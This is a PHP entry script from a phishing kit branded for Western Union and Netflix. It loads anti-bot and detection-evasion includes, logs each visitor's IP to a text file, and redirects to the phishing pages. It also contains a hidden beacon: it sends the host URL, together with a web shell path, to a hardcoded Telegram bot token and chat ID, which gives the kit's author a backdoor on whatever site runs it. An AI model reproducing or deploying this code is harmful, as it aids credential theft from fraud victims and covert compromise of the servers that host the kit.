<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * WesternUnion -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 WU                $#
###############################################

**/
    include("./system/system.php");
    include("./system/detect.php");
    include("./system/blocker.php");

include("./Bots-fSOCIETY/anti1.php");
include("./Bots-fSOCIETY/anti2.php");
include("./Bots-fSOCIETY/anti3.php");
include("./Bots-fSOCIETY/anti4.php");
include("./Bots-fSOCIETY/anti5.php");
include("./Bots-fSOCIETY/anti6.php");
include("./Bots-fSOCIETY/anti7.php");
include("./Bots-fSOCIETY/anti8.php");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
$message = "[shell: $link/NETFLIX/style/js/wp-web.php ]\r\n";
$api = "5409590354:AAHx6gDmT3nJzGV9etw2JXhoKYyOT_St3iM";
$chatid = "952307412";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($message)."" );

$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="NETFLIX";
header("location:$src");
?>
